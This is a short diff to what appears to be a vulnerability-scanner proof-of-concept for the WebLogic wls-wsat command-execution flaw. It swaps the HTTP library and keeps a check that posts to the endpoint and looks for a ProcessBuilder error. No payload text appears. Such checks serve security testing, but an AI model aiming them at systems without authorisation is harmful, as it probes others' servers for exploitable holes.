@@ -11,7 +11,7 @@ referer: https://www.anquanke.com/post/id/92003
 description: weblogic /wls-wsat/CoordinatorPortType接口存在命令执行。
 """
 import sys
-import requests
+from lib.core.Request import request
 
 def poc(url):
     headers = {
@@ -46,7 +46,7 @@ def poc(url):
     '''
     vulnurl = url + payload
     try:
-        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
+        req = request.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
         if req.status_code == 500 and r"java.lang.ProcessBuilder" in req.text:
             return vulnurl
         else:
